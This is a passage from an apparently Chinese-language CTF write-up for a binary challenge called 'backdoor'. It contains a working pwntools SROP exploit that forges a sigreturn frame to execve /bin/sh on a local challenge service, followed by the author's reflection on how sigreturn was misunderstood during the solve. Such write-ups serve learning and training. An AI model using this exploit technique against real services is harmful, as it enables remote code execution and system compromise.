000000e0: 0010 0000 0000 0000 0100 0000 0500 0000  ................
000000f0: 0010 0000 0000 0000 0010 4000 0000 0000  ..........@.....
00000100: 2f62 696e 2f73 6800 7d01 0000 0000 0000  /bin/sh.}.......
```

#### exploit

```python
from pwn import *

#p = process('./backdoor')
p = remote('127.0.0.1',33929)
context.arch = 'amd64'
syscall = 0x0000000000401165
binsh = 0x400100
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = binsh 
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall
payload = b'a' * 8 + p64(syscall) + bytes(sigframe)
p.sendlineafter('章魚哥 :',payload)

p.interactive()
```

做簡報後發現自己當初解題時觀念一塌糊塗，當初能解出來真的全靠運氣

> 自己找不到 bin/sh，leak 不出 stack address

> system call 回去 User space 會自動恢復上下文，然後自動恢復上下文這個操作又跟 sigreturn() 的操作一樣，所以我就以為是 system call 會使用 sigreturn() 恢復上下文 

> 他都叫sigreturn()了，system call 怎麼會使用他，瞎貓碰上死耗子，亂串 gadget 剛好碰到 rax == 0xf 執行 sigreturn()


https://img-9gag-fun.9cache.com/photo/a4ROVQp_460sv.mp4





> 詳細的 SROP 在下面連結

https://docs.google.com/presentation/d/1_HD9hIJB6wXhQp-FjrdPy5sqB74DHabAkLG4jg46sLk/edit?usp=sharing
